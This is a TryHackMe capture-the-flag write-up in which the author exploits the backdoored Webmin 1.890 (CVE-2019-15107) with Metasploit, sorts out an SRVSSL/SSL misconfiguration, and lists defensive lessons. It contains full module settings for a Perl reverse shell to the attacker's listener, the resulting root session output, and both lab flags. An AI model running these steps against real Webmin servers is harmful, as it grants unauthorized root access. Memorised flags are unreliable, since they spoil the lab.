# TryHackMe — AttackerKB

**Webmin `password_change.cgi` Backdoor (CVE-2019-15107) | Metasploit | HTTPS/TLS Troubleshooting | Root Shell**

> **Full walkthrough — spoilers and both flags included.** This write-up documents my work in the authorized [TryHackMe](https://tryhackme.com/) *AttackerKB* lab. All exploitation was performed against the intentionally vulnerable training machine, not against a real-world target.


<img width="1707" height="166" alt="forside" src="https://github.com/user-attachments/assets/d1b275ff-7c01-4b39-b2b5-b7f400d4a9f7" />


## Overview

The room introduced the use of **AttackerKB** for vulnerability research and then guided us through exploiting a backdoored Webmin installation with Metasploit. I successfully gained a root command shell and recovered both flags.

What made this particular room memorable was the troubleshooting: although the target responded over TCP and HTTPS, Metasploit kept returning `Errno::ENOTCONN`. After investigating the network traffic and talking it through with my lecturer, **Jeremy**, I found an unexpected interaction between Metasploit's `SSL` and `SRVSSL` settings.

| Item | Details |
| --- | --- |
| Platform | TryHackMe — AttackerKB |
| Date completed | 9 October 2026 |
| Attacking machine | TryHackMe AttackBox — `10.112.87.100` |
| Target | TryHackMe Source lab machine — `10.112.148.127` |
| Vulnerable service | Webmin / MiniServ **1.890**, TCP port **10000** |
| Vulnerability | `password_change.cgi` backdoor — **CVE-2019-15107** |
| Exploit module | `exploit/linux/http/webmin_backdoor` |
| Payload | `cmd/unix/reverse_perl` |
| Result | Remote command shell running as **root**; user and root flags recovered |

**Tools used:** Nmap, a web browser, `/etc/hosts`, AttackerKB, Rapid7's vulnerability database, Metasploit Framework, Telnet, curl, tcpdump, and standard Linux commands.

> **Note:** These `10.x.x.x` addresses were assigned to one TryHackMe session. They change when lab machines are restarted; substitute your own addresses.

## 1. Reconnaissance — identifying Webmin

A targeted version scan revealed Webmin on TCP port `10000`:

```bash
nmap -sV -p 22,10000 10.112.148.127
```

Relevant findings:

```text
22/tcp     open  ssh      OpenSSH 7.6p1
10000/tcp  open  http     MiniServ 1.890 (Webmin httpd)
```

Even though Nmap labelled port `10000` as `http`, the Webmin service in this room expected **HTTPS**. Visiting the server with an ordinary HTTP URL resulted in an SSL-mode warning. The correct scheme was:

```text
https://10.112.148.127:10000/
```

The lab also asked us to resolve the host name `source`. I added the current target IP to the AttackBox's `/etc/hosts` file:

```bash
echo '10.112.148.127 source' | sudo tee -a /etc/hosts
```

After accepting the browser's warning for the self-signed certificate, I could reach the Webmin login page using:

```text
https://source:10000/
```

An important distinction: the hosts-file change allows `source` to resolve to an IP address. When Metasploit uses the numerical IP in `RHOSTS`, it does not ordinarily need that entry.

## 2. Vulnerability research — a supply-chain compromise

AttackerKB and the Rapid7 module documentation pointed to **CVE-2019-15107**, an authentication-bypassing command-execution backdoor in Webmin's `password_change.cgi` script.

The unusual part is **how the vulnerable code arrived in a legitimate product**. An attacker compromised Webmin's build/distribution environment and modified the packaged source, so affected official SourceForge releases contained malicious code that was not part of the clean source repository. According to Webmin's account of the incident:

- **Webmin 1.890** was vulnerable in a default installation.
- **Webmin 1.900–1.920** also contained the backdoor, but exploitation required the expired-password-changing feature to be enabled.
- The project released **Webmin 1.930** after learning of the issue in August 2019.

This is a **software supply-chain attack**: users could download what appeared to be legitimate software and unknowingly install maliciously modified components.

References:
- [Rapid7 — Webmin password_change.cgi Backdoor](https://www.rapid7.com/db/modules/exploit/linux/http/webmin_backdoor/)
- [Webmin — Security information and incident history](https://github.com/webmin/webmin/blob/master/SECURITY.md)


## 3. Configuring the Metasploit exploit

In the AttackBox terminal, I loaded the relevant module and configured it for my lab IP addresses:

```text
msfconsole
search webmin
use exploit/linux/http/webmin_backdoor
set RHOSTS 10.112.148.127
set RPORT 10000
set SSL true
set LHOST 10.112.87.100
set LPORT 4444
set PAYLOAD cmd/unix/reverse_perl
show options
```

What the settings mean:

| Option | Value | Purpose |
| --- | --- | --- |
| `RHOSTS` | `10.112.148.127` | Remote target (Source) |
| `RPORT` | `10000` | Webmin's listening port |
| `SSL` | `true` | Use HTTPS **outbound** to Webmin |
| `TARGETURI` | `/` | Webmin application path |
| `LHOST` | `10.112.87.100` | AttackBox IP for the reverse connection |
| `LPORT` | `4444` | Reverse shell listener |
| `PAYLOAD` | `cmd/unix/reverse_perl` | Unix reverse shell payload |
| `SRVSSL` | `false` **(important in my session)** | Use a separate setting for the module's local HTTP-server TLS behavior |

**Important:** The working module name in my installed version was `exploit/linux/http/webmin_backdoor`. Some generic Rapid7 documentation displays a different-looking module path, so I checked the module name returned by `search webmin` instead of assuming the documentation's example was an exact command.

### The working configuration

After troubleshooting, the configuration that worked included this additional setting:

```text
set SRVSSL false
```


<img width="1483" height="835" alt="show options" src="https://github.com/user-attachments/assets/e0e6728c-1d50-4004-8fe5-d4d6f98a1ee6" />


I then executed the module:

```text
run
```

The Metasploit output confirmed the result:

```text
[*] Started reverse TCP handler on 10.112.87.100:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Exploitable: version 1.890 is vulnerable
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.112.87.100:4444 -> 10.112.148.127:50976)
```

The shell was a **Unix command shell**, not a Meterpreter session. I verified my privileges:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

Webmin was running in a context that gave the exploited command execution **root privileges**. No separate privilege-escalation exploit was needed in this lab.

## 4. Troubleshooting — the unexpected `SRVSSL` setting

> **⚠️ Heads-up: this actually happened to me.** I spent a surprisingly long time trying to work out why Metasploit failed, even after restarting my entire TryHackMe AttackBox. If you see the same error, check both `SSL` **and** `SRVSSL` in `show options`!

### The recurring error

Every time I attempted `check` or `run`, Metasploit initially reported:

```text
[-] Exploit failed: Errno::ENOTCONN Transport endpoint is not connected - getpeername(2)
[-] 10.112.148.127:10000 - Check failed: The state could not be determined.
```

At first this looked like a network connectivity problem, but several tests complicated that explanation.

### What I tested

**1. TCP connectivity with Telnet**

```bash
telnet 10.112.148.127 10000
```

Result:

```text
Connected to 10.112.148.127.
```

This proved that a TCP connection to the Webmin port could be established. It did **not**, on its own, prove that HTTPS worked.

**2. HTTPS connectivity with curl**

```bash
curl -kv --http1.1 --max-time 10 https://10.112.148.127:10000/ -o /dev/null
```

This succeeded and returned the Webmin page over HTTPS. In an earlier instance of the same lab, I also used curl to trigger the vulnerable `password_change.cgi` path and saw `uid=0(root)` returned. Therefore, the vulnerable application itself was responding, even while the Metasploit module failed.

**3. Packet capture with tcpdump**

With a second AttackBox terminal open, I ran:

```bash
sudo tcpdump -i ens5 -nn -vv 'host 10.112.148.127 and tcp port 10000'
```

I captured traffic from both a failing Metasploit attempt and a successful curl request. The TCP three-way handshake (`SYN → SYN-ACK → ACK`) completed for both clients, and both exchanged application data. The server eventually sent FIN and RST packets in both cases.

**Lesson:** Seeing FIN/RST does not automatically identify the cause of an application-layer failure. I initially suspected the connection-closing sequence, but seeing a similar pattern with successful curl traffic meant I could not treat it as proof of the cause.

**4. A fresh AttackBox and the hosts-file entry**

Restarting the AttackBox and restoring `/etc/hosts` did **not** resolve the error. Browser access and curl succeeded, whereas Metasploit continued to fail.

### The setting that made the difference

After asking my lecturer, **Jeremy**:

```text
SSL     true
SRVSSL  true
```

I had **not deliberately set `SRVSSL true`**. I checked whether it was a global setting:

```text
getg SRVSSL
# SRVSSL =>
```

Nothing was configured globally. Then I ran:

```text
unset SRVSSL
```

Metasploit gave the crucial explanation:

```text
Variable "SRVSSL" unset - but will continue to use "SSL" as a fallback preference.
```

This explained why `show options` still displayed `SRVSSL true`: **when unset, it fell back to `SSL true`**. An inherited fallback value had looked like an option I must have changed myself.

I then explicitly separated the two settings:

```text
set SSL true
set SRVSSL false
run
```

**And the exploit worked immediately.** Metasploit identified Webmin 1.890 as vulnerable and opened a command shell.

The important technical distinction is that `SSL` controls the outgoing HTTPS connection to Webmin, while `SRVSSL` describes TLS for the module's *local* HTTP-server connections. The `cmd/unix/reverse_perl` payload itself uses a TCP reverse shell, not an HTTPS reverse shell. **I observed that overriding `SRVSSL` fixed my Metasploit attempt, but did not establish the deeper internal reason the inherited setting caused the error in this particular framework/session.**

This taught me to pay attention to **effective configuration values, fallback behavior, and the difference between client-side and server-side TLS**—not just whether a port is open.

## 5. Retrieving the flags

Once the root shell was established, I checked `/home`:

```bash
ls -la /home
# ... dark dark ... dark

ls -la /home/dark
# ... user.txt
```

Because the shell initially started in the Webmin application directory, I used **absolute paths** rather than assuming `user.txt` was in my current working directory:

```bash
cat /home/dark/user.txt
```

**User flag:**

```text
THM{SUPPLY_CHAIN_COMPROMISE}
```

Since `id` had confirmed root privileges, I could also read the root user's home directory:

```bash
ls -la /root
cat /root/root.txt
```

**Root flag:**

```text
THM{UPDATE_YOUR_INSTALL}
```


<img width="1010" height="332" alt="Begge flagg" src="https://github.com/user-attachments/assets/788dd58c-8e30-4136-b19a-4708d9c9cf97" />


The flag names nicely reinforce the room's lessons: a **supply-chain compromise** introduced the backdoor, and keeping software updated is a key defense.

## 6. Findings and defensive lessons

| Finding | Security significance | Defensive takeaway |
| --- | --- | --- |
| Backdoored Webmin 1.890 package | Supply-chain compromise enabled unauthenticated command execution | Obtain releases from trustworthy channels; validate artifact integrity and provenance; monitor vendor security notices |
| Exposed `password_change.cgi` backdoor | Remote attacker could execute commands as root | Replace affected versions with a clean, patched release; restrict administrative interfaces |
| Webmin accessible on TCP `10000` | Administrative service reachable over the network | Limit management-plane access with firewalls, VPNs, and network segmentation |
| Root-level service execution | Exploitation immediately granted privileged access | Apply least privilege where feasible; reduce unnecessary privileged service execution |
| Confusing TLS-related module settings | Incorrect configuration can obscure the actual failure | Inspect `show options`, verify global/local settings, and compare known-good traffic |

## 7. What I learned

- **A successful TCP connection is not the same as a successful HTTPS request.** Telnet, curl, and tcpdump each answered different diagnostic questions.
- **Check assumptions with packet captures.** FIN and RST appeared during both successful and unsuccessful client sessions; the packets alone did not explain the Metasploit error.
- **Metasploit settings can inherit values.** `SRVSSL` fell back to `SSL`, so an option could display `true` even though I had never explicitly set it.
- **Not all shells are Meterpreter sessions.** The `cmd/unix/reverse_perl` payload gave me a command shell, and `id` verified root access.
- **A supply-chain attack can make an official download unsafe.** The backdoor originated in the release process, rather than in a deliberately vulnerable feature added by the legitimate developers.
- **Persistence matters in troubleshooting.** After several hours of unsuccessful attempts, changing one overlooked setting finally produced the desired result—and taught me more than a successful first attempt would have.

---

*Educational documentation of a completed, intentionally vulnerable TryHackMe lab. Session-specific IP addresses and configurations are included for reproducibility; they are not instructions to target systems without permission.*
